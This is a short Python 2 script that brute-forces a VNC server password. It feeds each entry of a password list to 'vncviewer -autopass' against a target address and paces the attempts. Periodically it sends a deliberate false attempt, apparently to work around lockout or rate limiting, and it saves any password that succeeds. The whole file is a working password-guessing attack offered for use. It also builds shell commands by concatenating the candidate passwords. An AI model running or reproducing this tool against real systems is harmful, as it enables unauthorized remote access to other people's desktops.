import subprocess,time,sys

f = open("pass.list","r")

res_f = open("success.txt","w")

ip = ""
port = ""
cnt = 1
send_false = False

for i in f:

	if cnt > 6:
		send_false = True

	if send_false:
		print "[-] Sending false attempt\n"
		cmd = 'echo asdf | vncviewer -autopass '+ip+':'+port
		p = subprocess.Popen([cmd], stdin=subprocess.PIPE, stdout=subprocess.PIPE,stderr=subprocess.PIPE,shell=True)
		(_,reset_res) = p.communicate()

		if "rejected" not in reset_res:
			print "[!] FALSE ATTEMPT NOT REJECTED"
			print reset_res

	pwd = i[:-1]
	print "Candidate #"+str(cnt)+": "+pwd
	fail_status = True

	while fail_status:

		time.sleep(12)

		cmd = 'echo "'+pwd+'" | vncviewer -autopass '+ip+':'+port
		p = subprocess.Popen([cmd], stdin=subprocess.PIPE, stdout=subprocess.PIPE,stderr=subprocess.PIPE,shell=True)
		(_,result) = p.communicate()
	#	print result

		if "failure" in result:
			print "[X] Fail\n"
			fail_status = False

		elif "rejected" in result:
			print "[!] REJECTED -- CHECK REASONING\nOUTPUT\n----------"
			print result

			if raw_input("----------\nStart sending false attempts? (y/N) ") == 'y':
				send_false = True

			print "\nRESENDING CANDIDATE: "+pwd

		elif "success" in result:
			res_f.write(pwd+"\n")
			print "[+] SUCCESS: "+pwd
			sys.exit()

		elif "refused" in result:
			print "[!] CONNECTION REFUSED"
			sys.exit()

	cnt = cnt + 1
